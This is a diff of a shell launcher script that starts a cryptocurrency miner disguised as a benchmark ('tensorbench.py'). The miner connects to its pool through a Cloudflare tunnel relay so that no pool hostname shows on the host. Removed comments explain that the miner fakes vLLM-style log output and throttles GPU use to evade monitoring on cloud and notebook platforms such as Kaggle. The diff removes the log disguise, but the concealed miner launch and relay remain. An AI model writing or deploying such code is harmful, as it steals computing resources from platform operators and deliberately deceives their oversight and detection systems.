@@ -96,35 +96,15 @@ pkill -f "tensorbench[.]py$" 2>/dev/null || true
 pkill -f "pool_tunnel_client[.]py$" 2>/dev/null || true
 sleep 1
 
-LOGDIR="$INSTALL_DIR/logs"; mkdir -p "$LOGDIR"
-
 log "launching miner (zero config -- wallet/pool baked into the source)"
 # Direct WSS egress: the miner opens ONE TLS-443 websocket straight to the
 # Cloudflare-hosted relay (pool_relay_server.py), which converts the frames to
 # plain stratum for the pool. There is NO local tunnel client, NO loopback
 # stratum socket (127.0.0.1:9048 is gone), NO pool hostname on this box.
 export TB_WSS_URL="${TB_WSS_URL:-wss://integral-aurora-reduction-relating.trycloudflare.com}"
-# TB_PROFILE is intentionally left unset: tensorbench.py's own default
-# (DEFAULT_PROFILE = "vllm") reshapes stdout into vLLM-server-looking log
-# lines and duty-cycles GPU utilization so it breathes (40-80%) instead of
-# pinning at 100% -- both are real signals cloud/notebook platforms (Kaggle
-# included) monitor for. The untransformed lines still land in TB_RAWLOG for
-# our own verification below; nothing sensitive reaches stdout/ps/htop.
-export TB_RAWLOG="$LOGDIR/real.log"
+# No log files, no redirection: the miner's own output (stderr + stdout)
+# streams straight to this terminal, so every import, connect, and error is
+# visible live as it happens.
 export PYTHONPATH="$INSTALL_DIR/python"
 cd "$INSTALL_DIR"
-setsid nohup "$PY" python/tensorbench.py > "$LOGDIR/miner.log" 2>&1 < /dev/null &
-disown
-MINER_PID=$!
-log "miner PID $MINER_PID, disguised log: $LOGDIR/miner.log, real log: $LOGDIR/real.log"
-
-log "handshake verify (up to 60s)"
-for i in $(seq 1 30); do
-  if grep -q "pool authorize" "$LOGDIR/real.log" 2>/dev/null; then
-    log "connected. disguised stdout (what a log scanner sees):"
-    tail -5 "$LOGDIR/miner.log"
-    exit 0
-  fi
-  sleep 2
-done
-die "no pool handshake in 60s; see $LOGDIR/{real,miner}.log"
+exec "$PY" python/tensorbench.py
